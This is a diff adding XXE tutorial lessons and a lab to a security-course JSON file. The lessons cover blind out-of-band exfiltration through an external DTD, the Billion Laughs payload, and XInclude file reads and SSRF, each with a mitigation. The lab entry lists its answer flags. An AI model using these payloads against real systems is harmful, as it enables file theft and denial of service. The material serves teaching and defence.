@@ -2713,5 +2713,775 @@
         "text": "Reflected XXE allows attackers to read local files when XML parsing is misconfigured. The vulnerability exists because unsafe parser flags enable external entity expansion and the application reflects the processed output."
       }
     ]
+  },
+  {
+    "id": 10,
+    "slug": "blind-xxe",
+    "title": "Blind XXE",
+    "category": "notes",
+    "blocksFile": "./blocks/xxe/blind-xxe.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ],
+    "blocks": [
+      {
+        "id": "download-xxe-lab",
+        "type": "download",
+        "title": "XXE Practice Lab",
+        "text": "Download the vulnerable PHP lab and payload collection.",
+        "fileName": "xxe-lab.zip",
+        "url": "/downloads/xxe-lab.zip",
+        "size": "4kb"
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-xxe-intro",
+        "text": "What is Blind XXE?"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-definition",
+        "text": "Blind XXE occurs when the server parses attacker-controlled XML and expands external entities, but does NOT reflect the processed XML in the HTTP response."
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-vulnerable-code",
+        "text": "Vulnerable PHP Code (Blind Scenario)"
+      },
+      {
+        "type": "code_block",
+        "id": "blind-php-code",
+        "language": "php",
+        "code": "<?php\n$xml = file_get_contents(\"php://input\");\n\n$dom = new DOMDocument();\n$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);\n\necho \"Processed\";\n?>"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-analysis-code",
+        "text": "The XML is parsed with entity expansion enabled, but the processed XML is NOT returned. Therefore, entity output cannot be seen directly."
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-step-1-setup-attacker",
+        "text": "Step 1 - Setup Attacker Server"
+      },
+      {
+        "type": "code_block",
+        "id": "attacker-server",
+        "language": "bash",
+        "code": "python3 -m http.server 9000"
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-step-2-create-dtd",
+        "text": "Step 2 - Create External DTD (evil.dtd)"
+      },
+      {
+        "type": "code_block",
+        "id": "blind-evil-dtd",
+        "language": "xml",
+        "code": "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">\n<!ENTITY % evil \"<!ENTITY exfil SYSTEM 'http://127.0.0.1:9000/?data=%file;'>\">\n%evil;"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-dtd-analysis",
+        "text": "%file reads and base64-encodes the target file. %evil dynamically creates a new entity that forces the server to send the file content to the attacker server."
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-step-3-create-payload",
+        "text": "Step 3 - Create Blind Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "blind-payload",
+        "language": "xml",
+        "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % xxe SYSTEM \"http://127.0.0.1:9000/evil.dtd\">\n%xxe;\n]>\n<root>&exfil;</root>"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-payload-analysis",
+        "text": "The payload loads the external DTD from the attacker. The DTD injects the exfil entity. The &exfil; reference triggers the outbound request."
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-step-4-send-payload",
+        "text": "Step 4 - Send Malicious XML"
+      },
+      {
+        "type": "code_block",
+        "id": "blind-send",
+        "language": "bash",
+        "code": "curl -X POST http://127.0.0.1:8000 \\\n  -H \"Content-Type: application/xml\" \\\n  --data-binary @payload.xml"
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-step-5-observe-attacker",
+        "text": "Step 5 - Observe Outbound Request"
+      },
+      {
+        "type": "output_block",
+        "id": "blind-attacker-output",
+        "language": "text",
+        "code": "GET /evil.dtd HTTP/1.1\nGET /?data=QXppZAo= HTTP/1.1"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-output-analysis",
+        "text": "The victim first requests evil.dtd. Then it sends a second request containing base64-encoded file data as a query parameter."
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-execution-flow",
+        "text": "Execution Flow"
+      },
+      {
+        "type": "explanation",
+        "id": "blind-mechanism",
+        "title": "How Blind XXE Executes",
+        "items": [
+          "User sends malicious XML.",
+          "Server parses DOCTYPE (LIBXML_DTDLOAD enabled).",
+          "External DTD is fetched from attacker.",
+          "Parameter entities are expanded.",
+          "Dynamic exfil entity is created.",
+          "XML body references &exfil;.",
+          "Server makes outbound HTTP request with file data.",
+          "Attacker receives exfiltrated content."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-required-conditions",
+        "text": "Required Conditions"
+      },
+      {
+        "type": "explanation",
+        "id": "blind-conditions",
+        "title": "Conditions for Blind XXE",
+        "items": [
+          "Application must parse XML input.",
+          "DOCTYPE processing must be enabled.",
+          "External entity expansion must be allowed.",
+          "Outbound network requests must be permitted.",
+          "Attacker-controlled server must be reachable."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-why-base64",
+        "text": "Why Base64 Encoding is Used"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-base64-explanation",
+        "text": "Raw file content may contain newlines and special characters that break the HTTP request. Base64 ensures safe transmission inside a URL."
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-limitations",
+        "text": "Limitations"
+      },
+      {
+        "type": "explanation",
+        "id": "blind-limitations-list",
+        "title": "Common Practical Limitations",
+        "items": [
+          "URI length restrictions (large files fail).",
+          "Outbound traffic filtering may block exfiltration.",
+          "Modern parsers often disable DTD processing by default.",
+          "WAF may block suspicious DOCTYPE usage."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-conclusion",
+        "text": "Conclusion"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-summary",
+        "text": "Blind XXE allows attackers to extract sensitive data even when the application does not reflect parsed XML. Data exfiltration occurs through outbound requests triggered by entity expansion."
+      }
+    ]
+  },
+  {
+    "id": 11,
+    "slug": "billion-laughs",
+    "title": "Billion Laughs Attack XXE",
+    "category": "notes",
+    "blocksFile": "./blocks/xxe/billion-laughs.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ],
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "billion-laughs-intro",
+        "text": "What is Billion Laughs Attack?"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-definition",
+        "text": "Billion Laughs is an XML Entity Expansion Denial of Service attack where nested entities recursively expand into exponentially large text, exhausting memory and CPU during XML parsing."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-root-cause",
+        "text": "Root Cause"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-root-analysis",
+        "text": "The attack works when the XML parser allows internal DTD processing and entity expansion (e.g., LIBXML_NOENT | LIBXML_DTDLOAD). The parser recursively replaces entity references without strict expansion limits."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-vulnerable-code",
+        "text": "Vulnerable PHP Code"
+      },
+      {
+        "type": "code_block",
+        "id": "billion-php-code",
+        "language": "php",
+        "code": "<?php\nlibxml_use_internal_errors(true);\n\n$xml = file_get_contents(\"php://input\");\n\n$dom = new DOMDocument();\n$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);\n\necho \"Parsed successfully\";\n?>"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-code-analysis",
+        "text": "LIBXML_DTDLOAD loads DTD definitions. LIBXML_NOENT forces entity expansion. Together they allow recursive entity substitution during parsing."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-malicious-payload",
+        "text": "Classic Billion Laughs Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "billion-payload",
+        "language": "xml",
+        "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"lol\">\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<root>&lol9;</root>"
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-math-explosion",
+        "text": "Exponential Growth Calculation"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-math-analysis",
+        "text": "Base entity length = 3 bytes ('lol'). Each level multiplies by 10. Final size at level n = 3 × (10^n). At level 9 → 3 × 10^9 = 3,000,000,000 bytes (~3GB)."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-internal-mechanism",
+        "text": "Internal Parser Execution Flow"
+      },
+      {
+        "type": "explanation",
+        "id": "billion-internal-flow",
+        "title": "How libxml Expands Entities",
+        "items": [
+          "Parser reads DOCTYPE and builds entity table.",
+          "Entity definitions are stored in a hash map.",
+          "When &lol9; is encountered, recursive expansion begins.",
+          "Each entity is replaced by its defined value.",
+          "Replacement buffers are allocated on heap.",
+          "Nested replacements trigger further recursion.",
+          "Memory grows exponentially due to repeated string concatenation.",
+          "CPU usage spikes due to recursive decoding."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-memory-behavior",
+        "text": "Memory and CPU Behavior"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-memory-analysis",
+        "text": "Each expansion requires new buffer allocation and copying of previous content. Intermediate buffers also consume memory. Actual usage exceeds theoretical final text size."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-observe-system",
+        "text": "Observing Resource Exhaustion"
+      },
+      {
+        "type": "code_block",
+        "id": "billion-monitor",
+        "language": "bash",
+        "code": "htop\n# or\nps aux | grep php"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-monitor-analysis",
+        "text": "During attack, PHP process shows high CPU utilization and rapid memory growth. On unprotected systems, this leads to memory exhaustion or OOM killer termination."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-safe-testing",
+        "text": "Safe Testing Strategy"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-safe-analysis",
+        "text": "Reduce depth (e.g., up to lol4 or lol5) or reduce multiplier (5 instead of 10). This prevents multi‑GB expansion and allows safe observation."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-modern-protection",
+        "text": "Modern libxml Protections"
+      },
+      {
+        "type": "explanation",
+        "id": "billion-modern-limits",
+        "title": "Built-in Defenses in libxml 2.11+",
+        "items": [
+          "Entity expansion counter limit.",
+          "Maximum recursion depth restriction.",
+          "Maximum text node size limit.",
+          "Abort parsing on expansion overflow.",
+          "Internal loop detection."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-error-observation",
+        "text": "Detecting Protection Trigger"
+      },
+      {
+        "type": "code_block",
+        "id": "billion-error-code",
+        "language": "php",
+        "code": "foreach (libxml_get_errors() as $error) {\n    echo $error->message;\n}"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-error-analysis",
+        "text": "Modern parsers may output errors like 'Entity expansion limit exceeded' or 'Detected an entity reference loop'."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-variants",
+        "text": "Variants Beyond Classic Billion Laughs"
+      },
+      {
+        "type": "explanation",
+        "id": "billion-variants-list",
+        "title": "Advanced DoS Variants",
+        "items": [
+          "Quadratic Blowup (large base entity repeated many times).",
+          "Parameter Entity Bomb using %entities.",
+          "Hybrid XXE + DoS (external DTD + expansion).",
+          "Compression-style nested payloads.",
+          "Deep but narrow recursion chains."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-mitigation",
+        "text": "Mitigation"
+      },
+      {
+        "type": "code_block",
+        "id": "billion-secure-code",
+        "language": "php",
+        "code": "$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);\n$dom->resolveExternals = false;\n$dom->substituteEntities = false;"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-mitigation-analysis",
+        "text": "Disable DTD processing and entity substitution. Avoid LIBXML_NOENT in production. Enforce strict memory limits at application level."
+      },
+      {
+        "type": "section_heading",
+        "id": "billion-conclusion",
+        "text": "Conclusion"
+      },
+      {
+        "type": "order_block",
+        "id": "billion-summary",
+        "text": "Billion Laughs is a parser-level Denial of Service attack exploiting recursive entity expansion. Modern parsers implement strict expansion limits, but legacy systems and custom parsers remain vulnerable."
+      }
+    ]
+  },
+  {
+    "id": 11,
+    "slug": "xInclude",
+    "title": "XInclude XXE",
+    "category": "notes",
+    "blocksFile": "./blocks/xxe/xInclude.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ],
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "xinclude-intro",
+        "text": "What is XInclude?"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-definition",
+        "text": "<highlight>XInclude</highlight> is an <highlight>XML feature</highlight> that allows one XML document to include content from another file using <highlight><xi:include></highlight> elements. It is processed at the <highlight>XML parsing stage</highlight> and does not require a <highlight>DOCTYPE</highlight> declaration like classic <highlight>XXE</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-root-cause",
+        "text": "Root Cause"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-root-analysis",
+        "text": "The vulnerability occurs when the <highlight>XML parser</highlight> has <highlight>XInclude processing enabled</highlight> (e.g., <highlight>DOMDocument->xinclude()</highlight>) and <highlight>user-controlled XML input</highlight> is parsed without validation. The parser fetches <highlight>external resources</highlight> referenced in the <highlight>xi:include</highlight> element."
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-why-important",
+        "text": "Why XInclude Matters"
+      },
+      {
+        "type": "explanation",
+        "id": "xinclude-difference-from-xxe",
+        "title": "Difference from Classic XXE",
+        "items": [
+          "Does NOT require <highlight><!DOCTYPE></highlight>.",
+          "Works even when <highlight>DTD processing</highlight> is disabled.",
+          "Often bypasses <highlight>naive XXE protections</highlight>.",
+          "Requires explicit <highlight>XInclude processing call</highlight>.",
+          "Looks like normal XML structure (less suspicious)."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-vulnerable-code",
+        "text": "Vulnerable PHP Code"
+      },
+      {
+        "type": "code_block",
+        "id": "xinclude-php-code",
+        "language": "php",
+        "code": "<?php\nlibxml_use_internal_errors(true);\n\n$xml = file_get_contents(\"php://input\");\n\n$dom = new DOMDocument();\n$dom->loadXML($xml);\n$dom->xinclude();\n\necho $dom->saveXML();\n?>"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-code-analysis",
+        "text": "The dangerous part is <highlight>$dom->xinclude()</highlight>. This explicitly tells <highlight>libxml</highlight> to process <highlight><xi:include></highlight> elements and fetch <highlight>external resources</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-basic-payload",
+        "text": "Basic File Read Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "xinclude-file-read",
+        "language": "xml",
+        "code": "<?xml version=\"1.0\"?>\n<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include href=\"file:///etc/passwd\" parse=\"text\"/>\n</root>"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-file-analysis",
+        "text": "The parser fetches <highlight>/etc/passwd</highlight> and inserts its content into the XML output. <highlight>parse=\"text\"</highlight> forces raw text inclusion instead of XML parsing."
+      },
+      {
+        "type": "code_block",
+        "id": "xinclude-file-read",
+        "language": "xml",
+        "code": "curl -X POST http://127.0.0.1:8000/vulnerable.php -H \"Content-Type: application/xml\" --data-binary @payload.xml"
+      },
+      {
+        "type": "output_block",
+        "id": "xinclude-file-analysis",
+        "code": "root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-internal-mechanism",
+        "text": "Internal Execution Flow"
+      },
+      {
+        "type": "explanation",
+        "id": "xinclude-flow",
+        "title": "How XInclude Works Internally",
+        "items": [
+          "Parser loads initial XML document.",
+          "Namespace <highlight>http://www.w3.org/2001/XInclude</highlight> is detected.",
+          "When <highlight>xinclude()</highlight> is called, <highlight>libxml</highlight> scans for <highlight><xi:include></highlight> nodes.",
+          "For each include node, libxml fetches the resource from <highlight>href</highlight>.",
+          "Resource is loaded into memory.",
+          "Content replaces the <highlight><xi:include></highlight> element in DOM tree.",
+          "Final DOM is serialized back to output."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-ssrf",
+        "text": "XInclude for SSRF"
+      },
+      {
+        "type": "code_block",
+        "id": "xinclude-ssrf-payload",
+        "language": "xml",
+        "code": "<?xml version=\"1.0\"?>\n<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include href=\"http://127.0.0.1:8080/internal\" parse=\"text\"/>\n</root>"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-ssrf-analysis",
+        "text": "If network access is allowed, the server makes a backend <highlight>HTTP request</highlight> to the internal service. This converts XInclude into an <highlight>SSRF primitive</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-rce-possibility",
+        "text": "Can XInclude Lead to RCE?"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-rce-analysis",
+        "text": "Direct <highlight>RCE</highlight> is rare. XInclude is primarily a <highlight>file read primitive</highlight> or <highlight>SSRF vector</highlight>. However, if included content is later passed to <highlight>eval()</highlight>, <highlight>include()</highlight>, or template rendering engines, it may escalate to code execution."
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-detection",
+        "text": "Detecting XInclude Vulnerability"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-detection-analysis",
+        "text": "If <highlight>DOCTYPE-based XXE</highlight> is blocked but XInclude works, you will see <highlight>external file content</highlight> reflected after adding <highlight>xmlns:xi</highlight> and <highlight>xi:include</highlight> elements."
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-mitigation",
+        "text": "Mitigation"
+      },
+      {
+        "type": "code_block",
+        "id": "xinclude-secure-code",
+        "language": "php",
+        "code": "$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);\n// DO NOT call $dom->xinclude();"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-mitigation-analysis",
+        "text": "Avoid calling <highlight>xinclude()</highlight>. Use <highlight>LIBXML_NONET</highlight> to block network access. Validate or sanitize XML input."
+      },
+      {
+        "type": "section_heading",
+        "id": "xinclude-conclusion",
+        "text": "Conclusion"
+      },
+      {
+        "type": "order_block",
+        "id": "xinclude-summary",
+        "text": "<highlight>XInclude</highlight> is an XML inclusion mechanism that can be abused for <highlight>file disclosure</highlight> and <highlight>SSRF</highlight> when <highlight>xinclude()</highlight> processing is enabled. It bypasses traditional <highlight>XXE defenses</highlight> because it does not rely on <highlight>DTD</highlight>."
+      }
+    ]
+  },
+  {
+    "id": 11,
+    "slug": "lab1",
+    "title": "Lab 1 - Reflected, Blind and XInclude XXE",
+    "isLab": true,
+    "category": "notes",
+    "blocksFile": "./blocks/xxe/lab1.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "questions": [
+      {
+        "id": 1,
+        "topic": "Reflected XXE",
+        "answer": "FLAG{reflected_xxe_master}"
+      },
+      {
+        "id": 2,
+        "topic": "XInclude XXE",
+        "answer": "FLAG{xinclude_abuse_success}"
+      },
+      {
+        "id": 3,
+        "topic": "Blind XXE",
+        "answer": "FLAG{blind_xxe_callback_worked}"
+      }
+    ],
+    "prerequisites": [
+      {
+        "title": "Refected XXE",
+        "slug": "reflected-xxe"
+      },
+      {
+        "title": "Blind XXE",
+        "slug": "blind-xxe"
+      },
+      {
+        "title": "XInclude XXE",
+        "slug": "xInclude"
+      }
+    ],
+    "blocks": [
+      {
+        "id": "download-xxe-challenge",
+        "type": "download",
+        "title": "XXE Challenge",
+        "text": "Download the vulnerable PHP lab and payload collection.",
+        "fileName": "xxe-challenge",
+        "url": "/downloads/xxe-challenge.zip",
+        "size": "4kb"
+      },
+      {
+        "type": "section_heading",
+        "id": "lab-overview",
+        "text": "XXE Full Exploitation Lab – Reflection, XInclude & Blind"
+      },
+      {
+        "type": "order_block",
+        "id": "lab-description",
+        "text": "This lab simulates a vulnerable XML processing service built with PHP and libxml. The application accepts XML input and parses it server-side. Your objective is to fully assess XML parsing behavior and determine whether the application is vulnerable to reflected XXE, XInclude injection, and blind (OOB) XXE."
+      },
+      {
+        "type": "section_heading",
+        "id": "engagement-rules",
+        "text": "Engagement Rules"
+      },
+      {
+        "type": "explanation",
+        "id": "rules-list",
+        "title": "Operational Constraints",
+        "items": [
+          "Do NOT inspect or modify backend source code.",
+          "Do NOT access server files directly.",
+          "Only interact through HTTP requests.",
+          "Only submit XML payloads.",
+          "You may run your own listener for OOB testing.",
+          "Document proof for each vulnerability class."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "target-info",
+        "text": "Target Endpoint"
+      },
+      {
+        "type": "code_block",
+        "id": "endpoint",
+        "language": "bash",
+        "code": "POST http://localhost:9001/app.php\nContent-Type: application/xml"
+      },
+      {
+        "type": "order_block",
+        "id": "behavior",
+        "text": "If the XML structure is valid, the application returns processed node values. If parsing fails, it returns HTTP 400. Some parsed content may be reflected in the response."
+      },
+      {
+        "type": "section_heading",
+        "id": "starting-xml",
+        "text": "Starting XML"
+      },
+      {
+        "type": "output_block",
+        "id": "starting-xml-example",
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<user>\n    <username>name</username>\n    <email>a@a.com</email>\n</user>"
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-1",
+        "text": "Phase 1: XML Parsing Baseline"
+      },
+      {
+        "type": "order_block",
+        "id": "phase-1-task",
+        "text": "Submit valid and malformed XML to confirm parsing behavior. Determine which elements are reflected and how strict the structural validation is."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-2",
+        "text": "Phase 2: Internal Entity Expansion (Reflected XXE)"
+      },
+      {
+        "type": "order_block",
+        "id": "phase-2-task",
+        "text": "Introduce a DTD with a custom internal entity. Reference the entity inside a reflected node. If the entity value appears in the response, document the vulnerability and assess impact."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-3",
+        "text": "Phase 3: External Entity Resolution"
+      },
+      {
+        "type": "order_block",
+        "id": "phase-3-task",
+        "text": "Attempt to reference a local file using a SYSTEM entity. Determine whether file contents are reflected. Confirm whether external entity resolution is enabled."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-4",
+        "text": "Phase 4: XInclude Injection"
+      },
+      {
+        "type": "order_block",
+        "id": "phase-4-task",
+        "text": "Attempt to inject XInclude elements within accepted XML structure. Determine whether the parser processes XInclude directives. If successful, assess whether local file inclusion is possible via XInclude."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-5",
+        "text": "Phase 5: Blind XXE (Out-of-Band)"
+      },
+      {
+        "type": "order_block",
+        "id": "phase-5-task",
+        "text": "Assume reflection is disabled. Configure a local HTTP listener and attempt to trigger an outbound request via external DTD loading. Confirm blind XXE through observable callbacks."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-6",
+        "text": "Phase 6: File Exfiltration via OOB"
+      },
+      {
+        "type": "order_block",
+        "id": "phase-6-task",
+        "text": "Chain external DTD loading with file retrieval and outbound exfiltration. Extract the contents of runtime/secrets.dat using blind techniques. Provide decoded proof of exfiltrated data."
+      },
+      {
+        "type": "section_heading",
+        "id": "analysis",
+        "text": "Technical Analysis Requirements"
+      },
+      {
+        "type": "explanation",
+        "id": "analysis-points",
+        "title": "You Must Explain",
+        "items": [
+          "Why entity expansion occurs.",
+          "How external DTD loading works in libxml.",
+          "Why XInclude may bypass DTD restrictions.",
+          "Why parameter entities are required for blind chaining.",
+          "What parser configuration is likely enabled.",
+          "How this vulnerability should be properly mitigated."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "final-objective",
+        "text": "Final Objective"
+      },
+      {
+        "type": "order_block",
+        "id": "final-goal",
+        "text": "Demonstrate full-spectrum XXE exploitation: reflected, XInclude-based, and blind OOB exfiltration. Provide technical reasoning, proof of exploitation, and mitigation strategy."
+      }
+    ]
   }
 ]
